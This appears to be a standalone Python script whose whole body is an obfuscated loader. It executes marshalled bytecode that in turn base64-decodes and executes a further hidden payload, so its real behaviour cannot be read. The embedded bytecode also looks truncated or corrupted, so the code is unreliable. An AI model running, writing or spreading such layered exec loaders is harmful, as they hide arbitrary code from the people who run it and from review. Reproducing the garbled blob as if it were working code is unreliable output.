#!/usr/bin/python3
import marshal; exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00sh\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01\x02\x00e\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00e\x01j\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z\x04\x02\x00e\x05e\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Ns<\x176\)\x06\xda\x07marshal\xda\x06base64\xda\x05loads\xda\tb64decode\xda\texec_code\xda\x04exec\xa9\x00\xf3\x00\x00\x00\x00\xfa\x08<string>\xfa\x08<module>r\x0b\x00\x00\x00\x01\x00\x00\x00s\xa2\x00\x00\x00\xf8\x80\x0e\x80\x0e\x80\x0e\x80\x0e\x90\r\x90\r\x90\r\x90\r\xa8=\xa87\xac=\xd09I\xb8\x16\xd49I\xf0\x00\x00K\x01J^a\r\xf1\x00\x00:K^a\r\xf4\x00\x00:K^a\r\xf1\x00\x00,L^a\r\xf4\x00\x00,L^a\r\x98y\xf0\x00\x00N^a\rR^a\r\xf0\x00\x00N^a\rR^a\r\xf0\x00\x00S^a\r\\^a\r\xf1\x00\x00N^a\r]^a\r\xf4\x00\x00N^a\r]^a\r\xf0\x00\x00N^a\r]^a\r\xf0\x00\x00N^a\r]^a\r\xf0\x00\x00N^a\r]^a\rr\t\x00\x00\x00'))